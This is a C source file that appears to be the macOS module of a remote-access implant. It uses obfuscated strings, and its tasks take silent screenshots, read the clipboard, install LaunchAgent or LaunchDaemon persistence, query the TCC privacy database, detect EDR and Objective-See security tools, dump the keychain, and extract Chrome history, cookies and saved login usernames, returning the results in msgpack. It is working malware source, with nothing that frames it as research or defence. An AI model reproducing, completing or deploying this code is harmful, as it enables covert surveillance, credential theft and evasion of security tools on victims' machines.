#include "tasks_macos.h"
#include "crt.h"
#include "dyld_resolve.h"
#include "strings_obf.h"

#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/wait.h>

#ifdef DEBUG_TRACE
#include "syscalls_arm64.h"
static void _mdbg(const char* msg) {
    size_t len = 0;
    const char* p = msg;
    while (*p++) len++;
    sys_write(2, msg, len);
    sys_write(2, "\n", 1);
}
#else
#define _mdbg(msg) ((void)0)
#endif

static void write_error(mp_writer_t* w, const char* msg) {
    mp_write_map(w, 1);
    mp_write_kv_str(w, "error", msg);
}

// Helper: run a command and capture output
static int run_capture(const char* prog, char* const argv[], char* output, size_t output_size) {
    int pipefd[2];
    if (R_pipe(pipefd) != 0) return -1;

    pid_t pid = R_fork();
    if (pid < 0) {
        R_close(pipefd[0]); R_close(pipefd[1]);
        return -1;
    }
    if (pid == 0) {
        R_close(pipefd[0]);
        R_dup2(pipefd[1], STDOUT_FILENO);
        R_dup2(pipefd[1], STDERR_FILENO);
        R_close(pipefd[1]);
        extern char*** _NSGetEnviron(void);
        char** environ = *_NSGetEnviron();
        R_execve(prog, argv, environ);
        R_exit(127);
    }

    R_close(pipefd[1]);
    size_t total = 0;
    ssize_t n;
    while (total < output_size - 1 && (n = R_read(pipefd[0], output + total, output_size - 1 - total)) > 0) {
        total += (size_t)n;
    }
    output[total] = '\0';
    R_close(pipefd[0]);

    int status;
    R_waitpid(pid, &status, 0);
    return WEXITSTATUS(status);
}

// Helper: dynamic buffer version of run_capture
static int run_capture_buf(const char* prog, char* const argv[], buffer_t* out) {
    int pipefd[2];
    if (R_pipe(pipefd) != 0) return -1;

    pid_t pid = R_fork();
    if (pid < 0) {
        R_close(pipefd[0]); R_close(pipefd[1]);
        return -1;
    }
    if (pid == 0) {
        R_close(pipefd[0]);
        R_dup2(pipefd[1], STDOUT_FILENO);
        R_dup2(pipefd[1], STDERR_FILENO);
        R_close(pipefd[1]);
        extern char*** _NSGetEnviron(void);
        char** environ = *_NSGetEnviron();
        R_execve(prog, argv, environ);
        R_exit(127);
    }

    R_close(pipefd[1]);
    char buf[4096];
    ssize_t n;
    while ((n = R_read(pipefd[0], buf, sizeof(buf))) > 0) {
        buf_append(out, (uint8_t*)buf, (size_t)n);
    }
    R_close(pipefd[0]);

    int status;
    R_waitpid(pid, &status, 0);
    return WEXITSTATUS(status);
}

// Parse a string field from msgpack
static int parse_string_field(const uint8_t* data, uint32_t data_len,
                                const char* key_name, char* out, size_t out_size) {
    mp_reader_t r;
    mp_reader_init(&r, data, data_len);
    uint32_t mc;
    if (mp_read_map(&r, &mc) != 0) return -1;
    for (uint32_t i = 0; i < mc; i++) {
        const char* k; uint32_t kl;
        if (mp_read_str(&r, &k, &kl) != 0) return -1;
        if (kl == ax_strlen(key_name) && ax_memcmp(k, key_name, kl) == 0) {
            const char* v; uint32_t vl;
            if (mp_read_str(&r, &v, &vl) != 0) return -1;
            if (vl >= out_size) vl = (uint32_t)(out_size - 1);
            ax_memcpy(out, v, vl);
            out[vl] = '\0';
            return 0;
        }
        mp_skip(&r);
    }
    return -1;
}

int task_screenshot(mp_writer_t* w) {
    // Generate unique temp filename
    DEOBF(tmp_prefix, OBF_TMP);
    char tmpfile[64];
    ax_strcpy(tmpfile, tmp_prefix);
    ax_strcat(tmpfile, "/.ax_");
    ZERO_STR(tmp_prefix, OBF_TMP);

    uint8_t rnd[6];
    ax_random_bytes(rnd, 6);
    size_t pos = ax_strlen(tmpfile);
    for (int i = 0; i < 6; i++) {
        tmpfile[pos + i*2]     = "0123456789abcdef"[(rnd[i] >> 4) & 0xf];
        tmpfile[pos + i*2 + 1] = "0123456789abcdef"[rnd[i] & 0xf];
    }
    tmpfile[pos + 12] = '\0';
    ax_strcat(tmpfile, ".png");

    DEOBF(screencapture_path, OBF_SCREENCAPTURE);
    _mdbg("[SCREENSHOT] path:");
    _mdbg(screencapture_path);
    _mdbg("[SCREENSHOT] tmpfile:");
    _mdbg(tmpfile);
    char* argv[] = { "screencapture", "-x", tmpfile, NULL };
    int ret = run_capture(screencapture_path, argv, (char[1]){0}, 1);
    ZERO_STR(screencapture_path, OBF_SCREENCAPTURE);

#ifdef DEBUG_TRACE
    {
        char rbuf[48];
        int ri = 0;
        const char* rp = "[SCREENSHOT] ret=";
        while (*rp) rbuf[ri++] = *rp++;
        int rv = ret;
        char nb[8]; int ni = 0;
        if (rv == 0) { nb[ni++] = '0'; }
        else { do { nb[ni++] = '0' + (rv % 10); rv /= 10; } while (rv > 0); }
        while (ni > 0) rbuf[ri++] = nb[--ni];
        rbuf[ri] = '\0';
        _mdbg(rbuf);
    }
#endif

    if (ret != 0) {
        R_unlink(tmpfile);
        write_error(w, "screencapture failed");
        return 0;
    }

    int fd = R_open(tmpfile, O_RDONLY, 0);
    if (fd < 0) {
        _mdbg("[SCREENSHOT] cannot open tmpfile (TCC Screen Recording permission likely missing)");
        write_error(w, "screenshot failed: file not created (Screen Recording TCC permission required)");
        return 0;
    }

    buffer_t img;
    buf_init(&img, 65536);
    char buf[8192];
    ssize_t n;
    while ((n = R_read(fd, buf, sizeof(buf))) > 0) {
        buf_append(&img, (uint8_t*)buf, (size_t)n);
    }
    R_close(fd);
    R_unlink(tmpfile);

#ifdef DEBUG_TRACE
    {
        char ibuf[48];
        int ii = 0;
        const char* ip = "[SCREENSHOT] img_len=";
        while (*ip) ibuf[ii++] = *ip++;
        size_t iv = img.len;
        char nb[12]; int ni = 0;
        do { nb[ni++] = '0' + (iv % 10); iv /= 10; } while (iv > 0);
        while (ni > 0) ibuf[ii++] = nb[--ni];
        ibuf[ii] = '\0';
        _mdbg(ibuf);
    }
#endif

    mp_write_map(w, 1);
    mp_write_str(w, "screens", 7);
    mp_write_array(w, 1);
    mp_write_bin(w, img.data, (uint32_t)img.len);

    buf_free(&img);
    return 0;
}

int task_clipboard(mp_writer_t* w) {
    buffer_t out;
    buf_init(&out, 4096);

    DEOBF(pbpaste_path, OBF_PBPASTE);
    char* argv[] = { "pbpaste", NULL };
    run_capture_buf(pbpaste_path, argv, &out);
    ZERO_STR(pbpaste_path, OBF_PBPASTE);

    char nul = '\0';
    buf_append(&out, (uint8_t*)&nul, 1);

    mp_write_map(w, 1);
    mp_write_kv_str(w, "output", (const char*)out.data);

    buf_free(&out);
    return 0;
}

int task_persist(const uint8_t* data, uint32_t data_len, mp_writer_t* w) {
    mp_reader_t r;
    mp_reader_init(&r, data, data_len);
    uint32_t mc;
    if (mp_read_map(&r, &mc) != 0) {
        write_error(w, "invalid params");
        return 0;
    }

    char action[32] = {0}, method[32] = {0}, name[256] = {0};
    for (uint32_t i = 0; i < mc; i++) {
        const char* k; uint32_t kl;
        if (mp_read_str(&r, &k, &kl) != 0) break;
        const char* v; uint32_t vl;
        if (kl == 6 && ax_memcmp(k, "action", 6) == 0) {
            mp_read_str(&r, &v, &vl);
            if (vl < sizeof(action)) { ax_memcpy(action, v, vl); action[vl] = '\0'; }
        } else if (kl == 6 && ax_memcmp(k, "method", 6) == 0) {
            mp_read_str(&r, &v, &vl);
            if (vl < sizeof(method)) { ax_memcpy(method, v, vl); method[vl] = '\0'; }
        } else if (kl == 4 && ax_memcmp(k, "name", 4) == 0) {
            mp_read_str(&r, &v, &vl);
            if (vl < sizeof(name)) { ax_memcpy(name, v, vl); name[vl] = '\0'; }
        } else {
            mp_skip(&r);
        }
    }

    buffer_t out;
    buf_init(&out, 4096);

    if (ax_strcmp(action, "status") == 0) {
        DEOBF(launchctl_path, OBF_LAUNCHCTL);
        char* argv[] = { "launchctl", "list", NULL };
        run_capture_buf(launchctl_path, argv, &out);
        ZERO_STR(launchctl_path, OBF_LAUNCHCTL);
    } else if (ax_strcmp(action, "install") == 0) {
        char exe_path[1024];
        uint32_t exe_size = sizeof(exe_path);
        extern int _NSGetExecutablePath(char*, uint32_t*);
        _NSGetExecutablePath(exe_path, &exe_size);

        char plist_path[1024];
        if (ax_strcmp(method, "launchdaemon") == 0) {
            DEOBF(ld_path, OBF_LAUNCH_DAEMONS);
            ax_strcpy(plist_path, ld_path);
            ax_strcat(plist_path, "/");
            ZERO_STR(ld_path, OBF_LAUNCH_DAEMONS);
        } else {
            const char* home = R_getenv("HOME");
            DEOBF(tmp_path, OBF_TMP);
            if (!home) home = tmp_path;
            ax_strcpy(plist_path, home);
            ax_strcat(plist_path, "/");
            DEOBF(la_path, OBF_LAUNCH_AGENTS);
            ax_strcat(plist_path, la_path);
            ax_strcat(plist_path, "/");
            ZERO_STR(la_path, OBF_LAUNCH_AGENTS);
            ZERO_STR(tmp_path, OBF_TMP);
        }
        ax_strcat(plist_path, name);
        ax_strcat(plist_path, ".plist");

        char plist[2048];
        ax_strcpy(plist, "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
            "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
            "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
            "<plist version=\"1.0\">\n<dict>\n"
            "\t<key>Label</key>\n\t<string>");
        ax_strcat(plist, name);
        ax_strcat(plist, "</string>\n"
            "\t<key>ProgramArguments</key>\n\t<array>\n\t\t<string>");
        ax_strcat(plist, exe_path);
        ax_strcat(plist, "</string>\n\t</array>\n"
            "\t<key>RunAtLoad</key>\n\t<true/>\n"
            "\t<key>KeepAlive</key>\n\t<true/>\n"
            "</dict>\n</plist>\n");

        int fd = R_open(plist_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (fd < 0) {
            buf_free(&out);
            write_error(w, "cannot write plist");
            return 0;
        }
        R_write(fd, plist, ax_strlen(plist));
        R_close(fd);

        DEOBF(launchctl_path, OBF_LAUNCHCTL);
        char* argv[] = { "launchctl", "load", "-w", plist_path, NULL };
        run_capture_buf(launchctl_path, argv, &out);
        ZERO_STR(launchctl_path, OBF_LAUNCHCTL);

        char msg[1200];
        ax_strcpy(msg, "Installed: ");
        ax_strcat(msg, plist_path);
        ax_strcat(msg, "\n");
        buf_append(&out, (uint8_t*)msg, ax_strlen(msg));
    } else if (ax_strcmp(action, "remove") == 0) {
        char plist_path[1024];
        if (ax_strcmp(method, "launchdaemon") == 0) {
            DEOBF(ld_path, OBF_LAUNCH_DAEMONS);
            ax_strcpy(plist_path, ld_path);
            ax_strcat(plist_path, "/");
            ZERO_STR(ld_path, OBF_LAUNCH_DAEMONS);
        } else {
            const char* home = R_getenv("HOME");
            DEOBF(tmp_path, OBF_TMP);
            if (!home) home = tmp_path;
            ax_strcpy(plist_path, home);
            ax_strcat(plist_path, "/");
            DEOBF(la_path, OBF_LAUNCH_AGENTS);
            ax_strcat(plist_path, la_path);
            ax_strcat(plist_path, "/");
            ZERO_STR(la_path, OBF_LAUNCH_AGENTS);
            ZERO_STR(tmp_path, OBF_TMP);
        }
        ax_strcat(plist_path, name);
        ax_strcat(plist_path, ".plist");

        DEOBF(launchctl_path, OBF_LAUNCHCTL);
        char* argv[] = { "launchctl", "unload", "-w", plist_path, NULL };
        run_capture_buf(launchctl_path, argv, &out);
        ZERO_STR(launchctl_path, OBF_LAUNCHCTL);
        R_unlink(plist_path);

        char msg[1200];
        ax_strcpy(msg, "Removed: ");
        ax_strcat(msg, plist_path);
        buf_append(&out, (uint8_t*)msg, ax_strlen(msg));
    } else {
        buf_free(&out);
        write_error(w, "unknown persist action");
        return 0;
    }

    char nul = '\0';
    buf_append(&out, (uint8_t*)&nul, 1);

    mp_write_map(w, 1);
    mp_write_kv_str(w, "output", (const char*)out.data);
    buf_free(&out);
    return 0;
}

int task_tcc_check(mp_writer_t* w) {
    buffer_t out;
    buf_init(&out, 4096);

    const char* home = R_getenv("HOME");
    char db_path[1024];
    DEOBF(tcc_db, OBF_TCC_DB);
    if (home) {
        ax_strcpy(db_path, home);
        ax_strcat(db_path, "/Library/Application Support/com.apple.TCC/TCC.db");
    } else {
        ax_strcpy(db_path, tcc_db);
    }
    ZERO_STR(tcc_db, OBF_TCC_DB);

    DEOBF(sqlite3_path, OBF_SQLITE3);
    char* argv[] = { "sqlite3", db_path, "SELECT service,client,auth_value FROM access;", NULL };
    int ret = run_capture_buf(sqlite3_path, argv, &out);

    if (ret != 0 || out.len == 0) {
        buf_reset(&out);
        DEOBF(tcc_db2, OBF_TCC_DB);
        char* argv2[] = { "sqlite3", tcc_db2,
                          "SELECT service,client,auth_value FROM access;", NULL };
        run_capture_buf(sqlite3_path, argv2, &out);
        ZERO_STR(tcc_db2, OBF_TCC_DB);
    }
    ZERO_STR(sqlite3_path, OBF_SQLITE3);

    if (out.len == 0) {
        buf_free(&out);
        mp_write_map(w, 1);
        mp_write_kv_str(w, "output", "TCC database not readable (requires FDA)");
        return 0;
    }

    char nul = '\0';
    buf_append(&out, (uint8_t*)&nul, 1);

    mp_write_map(w, 1);
    mp_write_kv_str(w, "output", (const char*)out.data);
    buf_free(&out);
    return 0;
}

int task_defaults_read(const uint8_t* data, uint32_t data_len, mp_writer_t* w) {
    char domain[256] = {0};
    parse_string_field(data, data_len, "domain", domain, sizeof(domain));

    buffer_t out;
    buf_init(&out, 4096);

    DEOBF(defaults_path, OBF_DEFAULTS);
    if (domain[0] != '\0') {
        char* argv[] = { "defaults", "read", domain, NULL };
        run_capture_buf(defaults_path, argv, &out);
    } else {
        char* argv[] = { "defaults", "read", NULL };
        run_capture_buf(defaults_path, argv, &out);
    }
    ZERO_STR(defaults_path, OBF_DEFAULTS);

    char nul = '\0';
    buf_append(&out, (uint8_t*)&nul, 1);

    mp_write_map(w, 1);
    mp_write_kv_str(w, "output", (const char*)out.data);
    buf_free(&out);
    return 0;
}

int task_edr_check(mp_writer_t* w) {
    buffer_t out;
    buf_init(&out, 4096);

    // EDR paths — decode each from OBF, check, zero
    const uint8_t* edr_obf[] = {
        OBF_EDR_CS_FALCONCTL, OBF_EDR_CS_FALCON, OBF_EDR_ADDIGY,
        OBF_EDR_MALWAREBYTES, OBF_EDR_JAMF, OBF_EDR_S1_APP,
        OBF_EDR_S1_LIB, OBF_EDR_ES_KEXT, OBF_EDR_SOPHOS,
        OBF_EDR_ELASTIC, OBF_EDR_BLOCKBLOCK, OBF_EDR_LULU,
        OBF_EDR_KNOCKKNOCK, OBF_EDR_REIKEY, OBF_EDR_XPROTECT,
    };
    const int edr_sizes[] = {
        sizeof(OBF_EDR_CS_FALCONCTL), sizeof(OBF_EDR_CS_FALCON), sizeof(OBF_EDR_ADDIGY),
        sizeof(OBF_EDR_MALWAREBYTES), sizeof(OBF_EDR_JAMF), sizeof(OBF_EDR_S1_APP),
        sizeof(OBF_EDR_S1_LIB), sizeof(OBF_EDR_ES_KEXT), sizeof(OBF_EDR_SOPHOS),
        sizeof(OBF_EDR_ELASTIC), sizeof(OBF_EDR_BLOCKBLOCK), sizeof(OBF_EDR_LULU),
        sizeof(OBF_EDR_KNOCKKNOCK), sizeof(OBF_EDR_REIKEY), sizeof(OBF_EDR_XPROTECT),
    };
    const char* edr_names[] = {
        "CrowdStrike Falcon (falconctl)", "CrowdStrike Falcon (support dir)",
        "Addigy", "Malwarebytes", "Jamf", "SentinelOne Agent",
        "SentinelOne (sentinel-agent)", "EndpointSecurity kext", "Sophos",
        "Elastic Endpoint", "BlockBlock (Objective-See)", "LuLu (Objective-See)",
        "KnockKnock (Objective-See)", "ReiKey (Objective-See)", "XProtect / Apple HV",
    };

    for (int i = 0; i < 15; i++) {
        char path_buf[256];
        xor_decode(path_buf, edr_obf[i], edr_sizes[i] - 1);

        struct stat st;
        if (R_stat(path_buf, &st) == 0) {
            char line[256];
            ax_strcpy(line, "[FOUND] ");
            ax_strcat(line, edr_names[i]);
            ax_strcat(line, "\n");
            buf_append(&out, (uint8_t*)line, ax_strlen(line));
        }

        volatile char* vp = (volatile char*)path_buf;
        for (int j = 0; j < (int)sizeof(path_buf); j++) vp[j] = 0;
    }

    // Check running processes
    DEOBF(ps_path, OBF_PS);
    char* argv[] = { "ps", "aux", NULL };
    buffer_t ps_out;
    buf_init(&ps_out, 8192);
    run_capture_buf(ps_path, argv, &ps_out);
    ZERO_STR(ps_path, OBF_PS);

    char nul = '\0';
    buf_append(&ps_out, (uint8_t*)&nul, 1);

    const char* known_procs[] = {
        "falcond", "falcon-sensor",
        "SentinelAgent",
        "elastic-agent",
        "sophosd",
        "jamfdaemon", "jamf",
        NULL
    };

    for (int i = 0; known_procs[i]; i++) {
        if (ax_strstr((const char*)ps_out.data, known_procs[i])) {
            char line[256];
            ax_strcpy(line, "[RUNNING] ");
            ax_strcat(line, known_procs[i]);
            ax_strcat(line, "\n");
            buf_append(&out, (uint8_t*)line, ax_strlen(line));
        }
    }
    buf_free(&ps_out);

    if (out.len == 0) {
        buf_append(&out, (uint8_t*)"No EDR products detected\n", 25);
    }
    buf_append(&out, (uint8_t*)&nul, 1);

    mp_write_map(w, 1);
    mp_write_kv_str(w, "output", (const char*)out.data);
    buf_free(&out);
    return 0;
}

int task_keychain(const uint8_t* data, uint32_t data_len, mp_writer_t* w) {
    char action[32] = {0};
    parse_string_field(data, data_len, "action", action, sizeof(action));

    buffer_t out;
    buf_init(&out, 4096);

    DEOBF(security_path, OBF_SECURITY_BIN);
    if (ax_strcmp(action, "list") == 0) {
        char* argv[] = { "security", "list-keychains", NULL };
        run_capture_buf(security_path, argv, &out);
    } else if (ax_strcmp(action, "dump") == 0) {
        char* argv[] = { "security", "dump-keychain", "-d", NULL };
        run_capture_buf(security_path, argv, &out);
    } else {
        ZERO_STR(security_path, OBF_SECURITY_BIN);
        buf_free(&out);
        write_error(w, "unknown keychain action");
        return 0;
    }
    ZERO_STR(security_path, OBF_SECURITY_BIN);

    char nul = '\0';
    buf_append(&out, (uint8_t*)&nul, 1);

    mp_write_map(w, 1);
    mp_write_kv_str(w, "output", (const char*)out.data);
    buf_free(&out);
    return 0;
}

int task_browser_dump(const uint8_t* data, uint32_t data_len, mp_writer_t* w) {
    mp_reader_t r;
    mp_reader_init(&r, data, data_len);
    uint32_t mc;
    if (mp_read_map(&r, &mc) != 0) {
        write_error(w, "invalid params");
        return 0;
    }

    char browser[32] = {0}, target[32] = {0};
    for (uint32_t i = 0; i < mc; i++) {
        const char* k; uint32_t kl;
        if (mp_read_str(&r, &k, &kl) != 0) break;
        const char* v; uint32_t vl;
        if (kl == 7 && ax_memcmp(k, "browser", 7) == 0) {
            mp_read_str(&r, &v, &vl);
            if (vl < sizeof(browser)) { ax_memcpy(browser, v, vl); browser[vl] = '\0'; }
        } else if (kl == 6 && ax_memcmp(k, "target", 6) == 0) {
            mp_read_str(&r, &v, &vl);
            if (vl < sizeof(target)) { ax_memcpy(target, v, vl); target[vl] = '\0'; }
        } else {
            mp_skip(&r);
        }
    }

    const char* home = R_getenv("HOME");
    DEOBF(tmp_path, OBF_TMP);
    if (!home) home = tmp_path;

    buffer_t out;
    buf_init(&out, 4096);

    if (ax_strcmp(browser, "chrome") == 0) {
        DEOBF(chrome_default, OBF_CHROME_DEFAULT);
        char base_path[1024];
        ax_strcpy(base_path, home);
        ax_strcat(base_path, "/");
        ax_strcat(base_path, chrome_default);
        ZERO_STR(chrome_default, OBF_CHROME_DEFAULT);

        DEOBF(sqlite3_path, OBF_SQLITE3);
        if (target[0] == '\0') {
            DEOBF(ls_path, OBF_LS);
            char* argv[] = { "ls", "-la", base_path, NULL };
            run_capture_buf(ls_path, argv, &out);
            ZERO_STR(ls_path, OBF_LS);
        } else if (ax_strcmp(target, "history") == 0) {
            char db_path[1100];
            ax_strcpy(db_path, base_path);
            ax_strcat(db_path, "History");
            char* argv[] = { "sqlite3", db_path,
                "SELECT url, title, datetime(last_visit_time/1000000-11644473600,'unixepoch') FROM urls ORDER BY last_visit_time DESC LIMIT 100;",
                NULL };
            run_capture_buf(sqlite3_path, argv, &out);
        } else if (ax_strcmp(target, "cookies") == 0) {
            char db_path[1100];
            ax_strcpy(db_path, base_path);
            ax_strcat(db_path, "Cookies");
            char* argv[] = { "sqlite3", db_path,
                "SELECT host_key, name, path FROM cookies LIMIT 200;",
                NULL };
            run_capture_buf(sqlite3_path, argv, &out);
        } else if (ax_strcmp(target, "logins") == 0) {
            char db_path[1100];
            ax_strcpy(db_path, base_path);
            ax_strcat(db_path, "Login Data");
            char* argv[] = { "sqlite3", db_path,
                "SELECT origin_url, username_value FROM logins;",
                NULL };
            run_capture_buf(sqlite3_path, argv, &out);
        }
        ZERO_STR(sqlite3_path, OBF_SQLITE3);
    } else if (ax_strcmp(browser, "firefox") == 0) {
        DEOBF(firefox_profiles, OBF_FIREFOX_COOKIES);
        char profiles_path[1024];
        ax_strcpy(profiles_path, home);
        ax_strcat(profiles_path, "/");
        ax_strcat(profiles_path, firefox_profiles);
        ZERO_STR(firefox_profiles, OBF_FIREFOX_COOKIES);

        if (target[0] == '\0') {
            DEOBF(ls_path, OBF_LS);
            char* argv[] = { "ls", "-la", profiles_path, NULL };
            run_capture_buf(ls_path, argv, &out);
            ZERO_STR(ls_path, OBF_LS);
        } else {
            char msg[] = "Firefox data extraction requires profile discovery (not yet implemented)\n";
            buf_append(&out, (uint8_t*)msg, ax_strlen(msg));
        }
    } else {
        ZERO_STR(tmp_path, OBF_TMP);
        buf_free(&out);
        write_error(w, "unknown browser");
        return 0;
    }

    ZERO_STR(tmp_path, OBF_TMP);

    char nul = '\0';
    buf_append(&out, (uint8_t*)&nul, 1);

    mp_write_map(w, 1);
    mp_write_kv_str(w, "output", (const char*)out.data);
    buf_free(&out);
    return 0;
}
